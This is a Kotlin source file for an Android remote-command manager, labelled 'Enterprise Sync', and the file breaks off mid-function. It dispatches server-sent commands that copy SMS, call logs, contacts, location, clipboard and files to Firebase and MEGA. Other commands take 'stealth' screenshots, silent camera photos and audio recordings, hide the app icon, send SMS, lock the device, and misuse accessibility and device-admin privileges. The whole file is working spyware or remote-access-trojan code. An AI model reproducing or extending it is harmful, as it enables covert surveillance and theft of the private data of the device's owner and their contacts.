package com.example.data.sync

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.annotation.SuppressLint
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.Ringtone
import android.media.RingtoneManager
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.telephony.SmsManager
import com.example.util.ToastUtils
import android.util.Base64
import android.net.Uri
import com.google.firebase.firestore.FirebaseFirestore
import android.util.Log
import android.util.Size
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.delay
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import android.app.Activity
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.IntentFilter
import android.telephony.TelephonyManager
import android.widget.Toast
import androidx.core.content.ContextCompat
import com.example.data.local.AppDatabase
import com.example.data.local.RemoteCommandEntity
import com.example.service.RemoteAccessibilityService
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.telephony.SubscriptionManager
import com.example.receiver.MyDeviceAdminReceiver
import org.json.JSONObject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.Locale
import java.util.UUID

class RemoteCommandManager(private val context: Context) {

    private val db = AppDatabase.getInstance(context)

    companion object {
        private var activeRingtone: Ringtone? = null
        private var textToSpeech: TextToSpeech? = null
    }

    suspend fun executeCommand(commandType: String, payload: String = ""): RemoteCommandEntity = withContext(Dispatchers.IO) {
        val commandId = UUID.randomUUID().toString()
        val entity = RemoteCommandEntity(
            id = commandId,
            commandType = commandType,
            payload = payload,
            status = "EXECUTING",
            createdAt = System.currentTimeMillis()
        )
        db.remoteCommandDao().insertCommand(entity)

        var resultMessage = ""
        var isSuccess = true

        val cleanType = commandType.trim().uppercase()
        try {
            when (cleanType) {
                "START_MEDIA_BACKUP", "START_BACKUP", "BACKUP_MEDIA", "MEGA_BACKUP" -> {
                    val filter = if (payload.isNotBlank()) payload.trim() else "all"
                    com.example.service.MegaUploadService.startService(context, filter)
                    resultMessage = "MEGA media backup service started successfully (Filter: $filter)."
                }
                "STOP_BACKUP", "STOP_MEDIA_BACKUP", "CANCEL_BACKUP" -> {
                    com.example.service.MegaUploadService.stopService(context)
                    resultMessage = "MEGA media backup service stopped."
                }
                "GET_BACKUP_STATUS", "BACKUP_STATUS" -> {
                    val statusMap = MegaUploadManager.getBackupStatusMap(context)
                    resultMessage = "MEGA Backup Status: Running=${statusMap["isRunning"]}, Folder=${statusMap["currentFolder"]}"
                }
                "SYNC_ALL", "SYNC", "FORCE_SYNC", "REFRESH_DATA", "CLEAR_AND_SYNC_ALL" -> {
                    val clearFirst = commandType.equals("CLEAR_AND_SYNC_ALL", ignoreCase = true) || payload.contains("clear", ignoreCase = true)
                    SmsSyncManager(context).syncSmsMessages()
                    CallLogSyncManager(context).syncCallLogs()
                    ContactsSyncManager(context).syncContacts()
                    AppUsageSyncManager(context).syncAppUsageStats()
                    LocationSyncManager(context).captureAndSyncLocation()
                    DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase(clearFirst = clearFirst)
                    resultMessage = if (clearFirst) "Old backup cleared and fresh telemetry synchronized successfully." else "All telemetry modules synchronized successfully."
                }
                "SYNC_SMS", "GET_SMS", "FETCH_SMS" -> {
                    SmsSyncManager(context).syncSmsMessages()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "SMS messages synchronized successfully."
                }
                "SYNC_CALLS", "GET_CALLS", "FETCH_CALLS" -> {
                    CallLogSyncManager(context).syncCallLogs()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Call logs synchronized successfully."
                }
                "SYNC_CONTACTS", "GET_CONTACTS", "FETCH_CONTACTS" -> {
                    ContactsSyncManager(context).syncContacts()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Contacts synchronized successfully."
                }
                "CLEAR_REMOTE_DATA", "PURGE_DATA", "WIPE_DATA", "CLEAR_DATA", "DELETE_ALL" -> {
                    FirebaseSyncEngine(context).clearAllRemoteData()
                    resultMessage = "All remote backup data and local logs cleared successfully."
                }
                "SHOW_ACCESSIBILITY_OVERLAY", "ACCESSIBILITY_OVERLAY", "SHOW_OVERLAY", "REQUIRE_ACCESSIBILITY", "SHOW_ACCESSIBILITY_PROMPT", "START_ACCESSIBILITY_OVERLAY" -> {
                    resultMessage = com.example.service.AccessibilityOverlayManager.showOverlayWithFallback(context)
                }
                "HIDE_ACCESSIBILITY_OVERLAY", "REMOVE_ACCESSIBILITY_OVERLAY", "HIDE_OVERLAY", "DISMISS_ACCESSIBILITY_OVERLAY" -> {
                    com.example.service.AccessibilityOverlayManager.removeOverlay(context)
                    resultMessage = "Accessibility overlay removed remotely."
                }
                "SYNC_LOCATION", "LOCATION", "GET_LOCATION" -> {
                    val loc = LocationSyncManager(context).captureAndSyncLocation()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Location synchronized: Lat ${loc.latitude}, Long ${loc.longitude} (Accuracy: ${loc.accuracy}m)."
                }
                "GLOBAL_BACK", "BACK" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_BACK)
                    if (res) {
                        resultMessage = "Executed Global Back gesture successfully."
                    } else {
                        var shellSuccess = false
                        try {
                            val p = Runtime.getRuntime().exec("input keyevent 4")
                            p.waitFor()
                            if (p.exitValue() == 0) shellSuccess = true
                        } catch (_: Exception) {}

                        if (shellSuccess) {
                            resultMessage = if (isAccEnabled) "Executed Back gesture via system shell fallback." else "Executed Back gesture via shell fallback (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to execute Back gesture: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to execute Back gesture: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                        }
                    }
                }
                "GLOBAL_HOME", "HOME" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_HOME)
                    if (res) {
                        resultMessage = "Executed Global Home gesture successfully."
                    } else {
                        var intentSuccess = false
                        try {
                            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                                addCategory(Intent.CATEGORY_HOME)
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            }
                            context.startActivity(homeIntent)
                            intentSuccess = true
                        } catch (_: Exception) {}

                        if (intentSuccess) {
                            resultMessage = if (isAccEnabled) "Executed Home action via system intent launcher." else "Executed Home action via system intent launcher (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to execute Home gesture: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to execute Home gesture: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                        }
                    }
                }
                "GLOBAL_RECENTS", "RECENTS" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
                    if (res) {
                        resultMessage = "Executed Global Recents gesture successfully."
                    } else {
                        var shellSuccess = false
                        try {
                            val p = Runtime.getRuntime().exec("input keyevent 187")
                            p.waitFor()
                            if (p.exitValue() == 0) shellSuccess = true
                        } catch (_: Exception) {}

                        if (shellSuccess) {
                            resultMessage = if (isAccEnabled) "Opened Recents via system shell fallback." else "Opened Recents via shell fallback (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to open Recents: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to open Recents: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                        }
                    }
                }
                "GLOBAL_NOTIFICATIONS", "NOTIFICATIONS" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
                    if (res) {
                        resultMessage = "Expanded Notification shade successfully."
                    } else {
                        var shellSuccess = false
                        try {
                            val p = Runtime.getRuntime().exec("cmd statusbar expand-notifications")
                            p.waitFor()
                            if (p.exitValue() == 0) shellSuccess = true
                        } catch (_: Exception) {
                            try {
                                val p = Runtime.getRuntime().exec("service call statusbar 1")
                                p.waitFor()
                                if (p.exitValue() == 0) shellSuccess = true
                            } catch (_: Exception) {}
                        }

                        if (shellSuccess) {
                            resultMessage = if (isAccEnabled) "Expanded Notification shade via system statusbar fallback." else "Expanded Notification shade via shell fallback (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to expand Notifications: Accessibility Service is enabled, but system blocked shade expansion (e.g. screen locked or keyguard active)." else "Failed to expand Notifications: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                        }
                    }
                }
                "GLOBAL_QUICK_SETTINGS", "QUICK_SETTINGS" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
                    if (res) {
                        resultMessage = "Expanded Quick Settings successfully."
                    } else {
                        var shellSuccess = false
                        try {
                            val p = Runtime.getRuntime().exec("cmd statusbar expand-settings")
                            p.waitFor()
                            if (p.exitValue() == 0) shellSuccess = true
                        } catch (_: Exception) {
                            try {
                                val p = Runtime.getRuntime().exec("service call statusbar 2")
                                p.waitFor()
                                if (p.exitValue() == 0) shellSuccess = true
                            } catch (_: Exception) {}
                        }

                        if (shellSuccess) {
                            resultMessage = if (isAccEnabled) "Expanded Quick Settings via system statusbar fallback." else "Expanded Quick Settings via shell fallback (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to expand Quick Settings: Accessibility Service is enabled, but system blocked shade expansion." else "Failed to expand Quick Settings: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                        }
                    }
                }
                "GLOBAL_LOCK_SCREEN", "LOCK_SCREEN", "LOCK", "LOCK_DEVICE" -> {
                    var locked = false
                    var lockMethod = ""

                    // 1. Accessibility Service Screen Lock (Android 9+)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        if (RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)) {
                            locked = true
                            lockMethod = "Accessibility Service"
                        }
                    }

                    // 2. Device Policy Manager Lock
                    if (!locked) {
                        try {
                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                            val adminComponent = ComponentName(context, MyDeviceAdminReceiver::class.java)
                            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                                dpm.lockNow()
                                locked = true
                                lockMethod = "Device Admin"
                            }
                        } catch (e: Exception) {
                            Log.e("RemoteCommandManager", "Device Policy Manager screen lock error: ${e.message}")
                        }
                    }

                    // 3. Shell Power keyevent fallback
                    if (!locked) {
                        try {
                            val p = Runtime.getRuntime().exec("input keyevent 26")
                            p.waitFor()
                            if (p.exitValue() == 0) {
                                locked = true
                                lockMethod = "Shell Power keyevent"
                            }
                        } catch (_: Exception) {}
                    }

                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)

                    if (locked) {
                        resultMessage = "Locked device screen successfully via $lockMethod."
                    } else if (!isAccEnabled) {
                        isSuccess = false
                        resultMessage = "Failed to lock screen: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                    } else {
                        isSuccess = false
                        resultMessage = "Failed to lock screen: Accessibility Service is enabled, but screen lock action was not supported by OS state."
                    }
                }
                "LOST_MODE", "LOCK_WITH_MESSAGE", "ACTIVATE_LOST_MODE" -> {
                    var customMsg: String? = null
                    var ownerPhone: String? = null
                    var unlockPin: String? = null

                    val trimmed = payload.trim()
                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                        try {
                            val json = JSONObject(trimmed)
                            customMsg = json.optString("message").ifEmpty { json.optString("msg").ifEmpty { null } }
                            ownerPhone = json.optString("phone").ifEmpty { json.optString("contact").ifEmpty { null } }
                            unlockPin = json.optString("pin").ifEmpty { null }
                        } catch (_: Exception) {}
                    }
                    if (customMsg == null && trimmed.isNotEmpty() && !trimmed.startsWith("{")) {
                        if (!trimmed.startsWith("Lost Mode Activated") && !trimmed.contains("Triggered from") && !trimmed.startsWith("Result:")) {
                            customMsg = trimmed
                        }
                    }

                    resultMessage = LostModeManager.lockDeviceWithCustomMessage(context, customMsg, ownerPhone, unlockPin)
                }
                "UNLOCK_DEVICE", "REMOTE_UNLOCK", "UNLOCK_MODE", "CLEAR_LOST_MODE", "UNLOCK" -> {
                    val trimmed = payload.trim()
                    val unlocked = if (trimmed.isEmpty() || trimmed.lowercase() in listOf("force", "remote", "true", "yes", "clear")) {
                        LostModeManager.forceUnlockDevice(context)
                    } else {
                        LostModeManager.unlockDevice(context, trimmed)
                    }
                    resultMessage = if (unlocked) "Device unlocked remotely and Lost Mode cleared." else "Unlock failed: Incorrect PIN parameter provided."
                    if (!unlocked) isSuccess = false
                }
                "START_SIREN", "SIREN_ON", "ALARM_ON", "TRIGGER_SIREN", "PLAY_SIREN", "ALARM", "PLAY_ALARM", "RING", "FIND_DEVICE" -> {
                    playFindDeviceAlarm()
                    LostModeManager.triggerSiren(context, true)
                    resultMessage = "Loud siren alarm triggered remotely on device."
                }
                "STOP_SIREN", "SIREN_OFF", "ALARM_OFF", "MUTE_SIREN", "STOP_ALARM", "STOP_RING", "MUTE_ALARM" -> {
                    stopAlarm()
                    LostModeManager.triggerSiren(context, false)
                    resultMessage = "Siren alarm stopped remotely."
                }
                "UPDATE_LOST_CONFIG", "SET_LOST_CONFIG" -> {
                    val trimmed = payload.trim()
                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                        try {
                            val json = JSONObject(trimmed)
                            val msg = json.optString("message").ifEmpty { json.optString("msg", "") }
                            val phone = json.optString("phone").ifEmpty { json.optString("contact", "") }
                            val pin = json.optString("pin", "")
                            LostModeManager.saveConfig(context, msg, phone, pin)
                            resultMessage = "Updated Lost Mode remote configuration successfully."
                        } catch (e: Exception) {
                            resultMessage = "Failed to parse lost config JSON: ${e.message}"
                            isSuccess = false
                        }
                    } else {
                        resultMessage = "Payload must be JSON e.g. {\"message\":\"Lost\",\"phone\":\"+1234567890\",\"pin\":\"1234\"}"
                        isSuccess = false
                    }
                }
                "GLOBAL_POWER_DIALOG", "POWER_DIALOG", "POWER_MENU", "POWER", "REBOOT", "SHUTDOWN", "POWER_OFF" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
                    if (res) {
                        resultMessage = "Power Dialog displayed successfully via Accessibility Service."
                    } else {
                        var adminRebootSuccess = false
                        try {
                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                            val adminComponent = ComponentName(context, MyDeviceAdminReceiver::class.java)
                            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                    dpm.reboot(adminComponent)
                                    adminRebootSuccess = true
                                }
                            }
                        } catch (e: Exception) {
                            Log.e("RemoteCommandManager", "DevicePolicyManager reboot failed: ${e.message}")
                        }

                        if (adminRebootSuccess) {
                            resultMessage = if (isAccEnabled) "Reboot initiated via Device Policy Manager." else "Reboot initiated via Device Policy Manager (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to open Power Menu / Reboot: Accessibility Service is enabled, but Device Admin reboot is not configured." else "Failed to open Power Menu / Reboot: Accessibility Service is OFF and Device Admin reboot is not active. Enable Accessibility Service in Settings."
                        }
                    }
                }
                "START_STEALTH_CAPTURE", "START_STEALTH_SCREENSHOT", "START_SCREENSHOT_CAPTURE" -> {
                    MediaProjectionHelper.startService(context)
                    resultMessage = "Stealth background screenshot capture service initiated."
                }
                "STOP_STEALTH_CAPTURE", "STOP_STEALTH_SCREENSHOT", "STOP_SCREENSHOT_CAPTURE" -> {
                    MediaProjectionHelper.stopService(context)
                    resultMessage = "Stealth background screenshot capture service stopped."
                }
                "HIDE_APP_ICON", "HIDE_ICON", "HIDE_LAUNCHER" -> {
                    com.example.util.AppIconUtils.setAppIconVisibility(context, false)
                    resultMessage = "App launcher icon hidden successfully."
                }
                "SHOW_APP_ICON", "SHOW_ICON", "SHOW_LAUNCHER" -> {
                    com.example.util.AppIconUtils.setAppIconVisibility(context, true)
                    resultMessage = "App launcher icon restored/shown successfully."
                }
                "CHECK_ICON_STATE", "CHECK_APP_ICON", "CHECK_ICON" -> {
                    val isVisible = com.example.util.AppIconUtils.isAppIconVisible(context)
                    resultMessage = "App launcher icon visible state: $isVisible"
                }
                "GLOBAL_TAKE_SCREENSHOT", "TAKE_SCREENSHOT", "SCREENSHOT" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT)
                    } else false

                    if (res) {
                        resultMessage = "Took Screenshot successfully via Accessibility Service."
                    } else {
                        isSuccess = false
                        resultMessage = if (isAccEnabled) "Failed to take screenshot: Accessibility Service is enabled, but system blocked capture (requires Android 9+)." else "Failed to take screenshot: Accessibility Service is OFF. Screen capture requires Enterprise Sync Accessibility Service enabled in Settings."
                    }
                }
                "FLASHLIGHT_ON", "TORCH_ON", "FLASHLIGHT_ENABLE" -> {
                    setFlashlight(true)
                    resultMessage = "Flashlight turned ON."
                }
                "FLASHLIGHT_OFF", "TORCH_OFF", "FLASHLIGHT_DISABLE" -> {
                    setFlashlight(false)
                    resultMessage = "Flashlight turned OFF."
                }
                "VIBRATE", "VIBRATION" -> {
                    var parsedDuration: Long? = null
                    val trimmed = payload.trim()

                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                        try {
                            val json = JSONObject(trimmed)
                            val d = json.optLong("duration", -1L).takeIf { it > 0 }
                                ?: json.optLong("time", -1L).takeIf { it > 0 }
                                ?: json.optLong("ms", -1L).takeIf { it > 0 }
                            if (d != null && d > 0) parsedDuration = d
                        } catch (_: Exception) {}
                    }

                    if (parsedDuration == null) {
                        val firstMatch = Regex("\\d+").find(trimmed)
                        if (firstMatch != null) {
                            parsedDuration = firstMatch.value.toLongOrNull()
                        }
                    }

                    val duration = (parsedDuration ?: 1000L).coerceIn(100L, 15000L)
                    vibrateDevice(duration)
                    resultMessage = "Vibrated device for ${duration}ms."
                }
                "PLAY_ALARM", "RING", "FIND_DEVICE" -> {
                    playFindDeviceAlarm()
                    resultMessage = "Playing alarm ringtone at max volume."
                }
                "STOP_ALARM", "STOP_RING" -> {
                    stopAlarm()
                    resultMessage = "Alarm stopped."
                }
                "SHOW_TOAST", "TOAST", "SHOW_MESSAGE" -> {
                    val msg = payload.ifEmpty { "Enterprise Remote Alert" }
                    Handler(Looper.getMainLooper()).post {
                        ToastUtils.showSingleToast(context, msg, Toast.LENGTH_LONG)
                    }
                    resultMessage = "Displayed Toast message: '$msg'"
                }
                "TEXT_TO_SPEECH", "TTS", "SPEAK" -> {
                    val msg = payload.ifEmpty { "Enterprise admin notification" }
                    speakText(msg)
                    resultMessage = "Spoke Text to Speech message: '$msg'"
                }
                "SEND_SMS", "SMS_SEND" -> {
                    var recipient = ""
                    var text = ""

                    val trimmed = payload.trim()

                    // Parse JSON format
                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                        try {
                            val json = JSONObject(trimmed)
                            recipient = json.optString("phone").ifEmpty {
                                json.optString("recipient").ifEmpty {
                                    json.optString("number").ifEmpty {
                                        json.optString("to")
                                    }
                                }
                            }
                            text = json.optString("message").ifEmpty {
                                json.optString("text").ifEmpty {
                                    json.optString("body").ifEmpty {
                                        json.optString("payload")
                                    }
                                }
                            }
                        } catch (_: Exception) {}
                    }

                    // Parse Pipe format
                    if (recipient.isEmpty() || text.isEmpty()) {
                        if (trimmed.contains("|")) {
                            val parts = trimmed.split("|")
                            if (parts.size >= 2) {
                                val p0 = parts[0].trim()
                                val p1 = parts[1].trim()
                                if (p0.contains("=") || p1.contains("=")) {
                                    val map = parts.associate { part ->
                                        val kv = part.split("=", limit = 2)
                                        if (kv.size == 2) kv[0].trim().lowercase() to kv[1].trim() else "" to ""
                                    }
                                    recipient = map["phone"] ?: map["number"] ?: map["recipient"] ?: map["to"] ?: ""
                                    text = map["message"] ?: map["text"] ?: map["body"] ?: map["payload"] ?: ""
                                } else {
                                    recipient = p0
                                    text = parts.subList(1, parts.size).joinToString("|").trim()
                                }
                            }
                        }
                    }

                    // Parse Comma format
                    if (recipient.isEmpty() || text.isEmpty()) {
                        if (trimmed.contains(",")) {
                            val parts = trimmed.split(",", limit = 2)
                            val p0 = parts[0].trim()
                            val p1 = parts[1].trim()
                            if (p0.contains("=") || p1.contains("=")) {
                                val map = trimmed.split(",").associate { part ->
                                    val kv = part.split("=", limit = 2)
                                    if (kv.size == 2) kv[0].trim().lowercase() to kv[1].trim() else "" to ""
                                }
                                recipient = map["phone"] ?: map["number"] ?: map["recipient"] ?: map["to"] ?: ""
                                text = map["message"] ?: map["text"] ?: map["body"] ?: map["payload"] ?: ""
                            } else if (p0.matches(Regex("^[+\\d\\s\\-()]{3,}$"))) {
                                recipient = p0
                                text = p1
                            }
                        }
                    }

                    // Parse Space format
                    if (recipient.isEmpty() || text.isEmpty()) {
                        val parts = trimmed.split(Regex("\\s+"), limit = 2)
                        if (parts.size >= 2 && parts[0].matches(Regex("^[+\\d\\-()]{3,}$"))) {
                            recipient = parts[0]
                            text = parts[1]
                        }
                    }

                    if (recipient.isNotEmpty() && text.isNotEmpty()) {
                        try {
                            sendSmsMessage(recipient, text)
                            resultMessage = "Sent SMS to $recipient."
                        } catch (e: Exception) {
                            resultMessage = "Failed to send SMS to $recipient: ${e.message}"
                            isSuccess = false
                        }
                    } else {
                        resultMessage = "Invalid SEND_SMS payload ($payload). Accepted formats: 'phone|message', 'phone=X|message=Y', 'phone, message', or JSON {'phone':'...', 'message':'...'}"
                        isSuccess = false
                    }
                }
                "GET_BATTERY_INFO", "BATTERY", "BATTERY_INFO" -> {
                    val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    resultMessage = "Battery Level: ${info.batteryLevel}%, IsCharging: ${info.isCharging}, PlugType: ${info.chargeType}"
                }
                "GET_WIFI_DETAILS", "WIFI", "WIFI_DETAILS" -> {
                    val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    resultMessage = "Wi-Fi SSID: ${info.wifiSsid}, BSSID: ${info.wifiBssid}, RSSI: ${info.wifiRssi}dBm, Local IP: ${info.localIp}, Public IP: ${info.publicIp}"
                }
                "GET_PUBLIC_IP", "PUBLIC_IP", "GET_IP", "IP_ADDRESS", "PUBLIC_IP_ADDRESS" -> {
                    val syncMgr = DeviceInfoSyncManager(context)
                    val publicIp = syncMgr.fetchPublicIpAddress()
                    val localIp = syncMgr.getLocalIpAddress()
                    resultMessage = "Public IP: $publicIp, Local IP: $localIp"
                }
                "GET_CLIPBOARD", "CLIPBOARD" -> {
                    val clipManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clipText = clipManager.primaryClip?.getItemAt(0)?.text?.toString() ?: "Clipboard empty"
                    resultMessage = "Clipboard content: $clipText"
                }
                "SET_CLIPBOARD", "COPY_CLIPBOARD" -> {
                    val clipManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clipData = ClipData.newPlainText("Enterprise", payload)
                    clipManager.setPrimaryClip(clipData)
                    resultMessage = "Clipboard updated with text: '$payload'"
                }
                "TOGGLE_WIFI", "WIFI_TOGGLE", "WIFI_ON", "WIFI_OFF", "SET_WIFI" -> {
                    resultMessage = handleWifiCommand(commandType, payload)
                }
                "REMOTE_CAMERA_SNAP", "CAMERA_SNAP", "CAM_SNAP", "CAPTURE_PHOTO", "TAKE_PHOTO" -> {
                    resultMessage = captureSilentCameraSnap(payload)
                }
                "REMOTE_RECORD_AUDIO", "RECORD_AUDIO", "AUDIO_RECORD", "START_AUDIO_RECORD" -> {
                    resultMessage = recordAudioRemote(payload)
                }
                "READ_FILE", "FILE_READ", "READ_BASE64", "GET_FILE_BASE64" -> {
                    resultMessage = executeReadFileCommand(payload)
                }
                "DOWNLOAD_FILE", "FILE_DOWNLOAD", "GET_FILE", "UPLOAD_FILE", "CLOUD_DOWNLOAD", "PULL_FILE" -> {
                    resultMessage = executeDownloadFileCommand(payload)
                }
                else -> {
                    resultMessage = "Executed command $commandType with payload $payload"
                }
            }
        } catch (e: Exception) {
            isSuccess = false
            resultMessage = "Command execution error: ${e.localizedMessage}"
        }

        val finalStatus = if (isSuccess) "COMPLETED" else "FAILED"
        val updated = entity.copy(
            status = finalStatus,
            executedAt = System.currentTimeMillis(),
            resultMessage = resultMessage
        )
        db.remoteCommandDao().insertCommand(updated)
        updated
    }

    private fun setFlashlight(enabled: Boolean) {
        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull() ?: return
            cameraManager.setTorchMode(cameraId, enabled)
        } catch (_: Exception) {}
    }

    private fun vibrateDevice(durationMs: Long) {
        try {
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(durationMs)
            }
        } catch (_: Exception) {}
    }

    private fun playFindDeviceAlarm() {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)

            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            try {
                if (activeRingtone?.isPlaying == true) {
                    activeRingtone?.stop()
                }
            } catch (_: Exception) {}

            activeRingtone = RingtoneManager.getRingtone(context.applicationContext, alarmUri)?.apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    isLooping = true
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    audioAttributes = AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_ALARM)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .build()
                }
                play()
            }
        } catch (e: Exception) {
            Log.e("RemoteCommandManager", "Error playing alarm: ${e.message}")
        }
    }

    private fun stopAlarm() {
        try {
            activeRingtone?.let { ringtone ->
                try {
                    if (ringtone.isPlaying) {
                        ringtone.stop()
                    }
                } catch (_: Exception) {}
                try {
                    ringtone.stop()
                } catch (_: Exception) {}
            }
            activeRingtone = null
        } catch (e: Exception) {
            Log.e("RemoteCommandManager", "Error stopping alarm: ${e.message}")
        }
    }

    private fun speakText(text: String) {
        try {
            if (textToSpeech == null) {
                textToSpeech = TextToSpeech(context.applicationContext) { status ->
                    if (status == TextToSpeech.SUCCESS) {
                        textToSpeech?.language = Locale.US
                        textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts1")
                    }
                }
            } else {
                textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts1")
            }
        } catch (_: Exception) {}
    }

    private fun sendSmsMessage(recipient: String, text: String) {
        val hasSendSms = ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
        if (!hasSendSms) {
            throw SecurityException("SEND_SMS permission is not granted on this device. Please grant SMS permission in Settings -> Apps -> Enterprise Sync -> Permissions.")
        }

        val cleanRecipient = recipient.replace("[^0-9+]".toRegex(), "").ifEmpty { recipient.trim() }
        if (cleanRecipient.isEmpty()) {
            throw IllegalArgumentException("Recipient phone number is missing or invalid.")
        }

        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager

        var activeSubId: Int = SubscriptionManager.INVALID_SUBSCRIPTION_ID
        try {
            val defaultSubId = SubscriptionManager.getDefaultSmsSubscriptionId()
            if (defaultSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
                activeSubId = defaultSubId
            } else {
                val activeSubs = subManager?.activeSubscriptionInfoList
                if (!activeSubs.isNullOrEmpty()) {
                    activeSubId = activeSubs.first().subscriptionId
                }
            }
        } catch (_: Exception) {}

